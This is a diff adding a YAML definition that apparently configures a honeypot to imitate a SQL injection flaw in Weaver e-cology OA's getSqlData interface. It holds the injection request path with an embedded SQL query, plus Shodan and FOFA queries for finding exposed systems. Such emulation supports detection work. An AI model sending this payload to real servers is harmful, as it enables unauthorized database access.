@@ -1,0 +1,37 @@
+id: weaver-ecology-getsqldata-sqli
+info:
+  name: Weaver E-Cology `getsqldata` - SQL Injection
+  author: SleepingBag945
+  description: 'When the getSqlData interface of the Panwei e-cology OA system uses
+    the mssql database, the built-in SQL statements are not spliced strictly, resulting
+    in a SQL injection vulnerability.
+
+    '
+  severity: high
+  reference:
+  - https://github.com/Wrin9/weaverOA_sql_RCE/blob/14cca7a6da7a4a81e7c7a7016cb0da75b8b290bc/weaverOA_sql_injection_POC_EXP.py#L46
+  metadata:
+    verified: true
+    max-request: 2
+    shodan-query: ecology_JSessionid
+    fofa-query: app="泛微-协同办公OA"
+  tags: ecology,weaver,oa,sqli
+traps:
+- request:
+    method: GET
+    path: /Api/portal/elementEcodeAddon/getSqlData?sql=select%20substring(sys.fn_sqlvarbasetostr(hashbytes('MD5','')),3,32)
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: '{{md5(num)}}{"api_status":"status":true}'
+- request:
+    method: GET
+    path: /Api/portal/elementEcodeAddon/getSqlData?sql=
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
